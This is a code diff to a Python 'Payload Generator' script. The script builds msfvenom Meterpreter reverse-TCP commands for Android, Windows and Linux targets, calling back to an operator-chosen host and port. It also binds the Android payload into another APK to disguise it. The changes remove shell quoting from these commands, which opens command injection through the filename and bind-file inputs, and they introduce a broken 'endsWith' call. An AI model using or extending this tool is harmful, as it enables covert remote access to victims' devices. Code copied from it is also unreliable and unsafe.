@@ -10,8 +10,8 @@ from pyfiglet import Figlet
 BOLD = "\033[1m"
 RESET = "\033[0m"
 
-# Create a custom Figlet font
-custom_figlet = Figlet(font="block")
+# Create a custom Figlet font with large characters
+custom_figlet = Figlet(font="banner")
 
 # Set up the logging system
 logging.basicConfig(filename="payload_generator.log", level=logging.INFO, format="%(asctime)s - %(levelname)s: %(message)s")
@@ -62,33 +62,33 @@ def generate_payload(ip, port, payload_type, bind=False, bind_file=None, custom_
                 raise ValueError("Invalid custom filename. Android payloads must have an '.apk' extension.")
 
             if custom_filename:
-                output_file = os.path.join("Payloads", custom_filename)
+                output_file = f"Payloads/{custom_filename}"
             else:
-                output_file = os.path.join("Payloads", "payload.apk")
+                output_file = f"Payloads/payload.apk"
 
-            payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o '{output_file}' --platform android -a dalvik"
+            payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} --platform android -a dalvik"
 
         elif payload_type == "windows":
             if custom_filename and not custom_filename.endswith(".exe"):
                 raise ValueError("Invalid custom filename. Windows payloads must have an '.exe' extension.")
 
             if custom_filename:
-                output_file = os.path.join("Payloads", custom_filename)
+                output_file = f"Payloads/{custom_filename}"
             else:
-                output_file = os.path.join("Payloads", "payload.exe")
+                output_file = f"Payloads/payload.exe"
 
-            payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o '{output_file}'"
+            payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"
 
         elif payload_type == "linux":
             if custom_filename and not custom_filename.endswith(".elf"):
                 raise ValueError("Invalid custom filename. Linux payloads must have an '.elf' extension.")
 
             if custom_filename:
-                output_file = os.path.join("Payloads", custom_filename)
+                output_file = f"Payloads/{custom_filename}"
             else:
-                output_file = os.path.join("Payloads", "payload.elf")
+                output_file = f"Payloads/payload.elf"
 
-            payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o '{output_file}'"
+            payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"
 
         create_payloads_folder()
 
@@ -97,15 +97,15 @@ def generate_payload(ip, port, payload_type, bind=False, bind_file=None, custom_
                 raise ValueError("Binding file path is required.")
             
             if payload_type == "android":
-                if custom_filename and not custom_filename.endswith(".apk"):
+                if custom_filename and not custom_filename.endsWith(".apk"):
                     raise ValueError("Invalid custom filename. Android payloads must have an '.apk' extension.")
 
                 if custom_filename:
-                    output_file = os.path.join("Payloads", custom_filename)
+                    output_file = f"Payloads/{custom_filename}"
                 else:
-                    output_file = os.path.join("Payloads", "bind_payload.apk")
+                    output_file = f"Payloads/bind_payload.apk"
 
-                binding_command = f"apktool b '{output_file}' -o '{output_file}' -f '{bind_file}'"
+                binding_command = f"apktool b {output_file} -o {output_file} -f {bind_file}"
                 bind_output = execute_command(binding_command, verbose)
                 if "Exception" in bind_output:
                     raise Exception(f"Binding failed: {bind_output}")
@@ -126,6 +126,9 @@ def generate_payload(ip, port, payload_type, bind=False, bind_file=None, custom_
 if __name__ == "__main__":
     verbose = False  # Set this to False to suppress the animation and command execution messages
 
+    # Clear the screen
+    os.system('clear' if os.name == 'posix' else 'cls')
+
     print(custom_figlet.renderText("Payload Generator"))
 
     # Ask for IP address and port
@@ -145,7 +148,7 @@ if __name__ == "__main__":
     elif choice == "3":
         payload_type = "linux"
     else:
-        print("Payload Generator: Invalid choice. Please choose a valid payload type.")
+        print(f"{BOLD}Payload Generator: Invalid choice. Please choose a valid payload type.{RESET}")
         exit()
 
     custom_filename = input(f"{BOLD}Payload Generator: Enter a custom filename (leave empty to use default naming): {RESET}").strip()
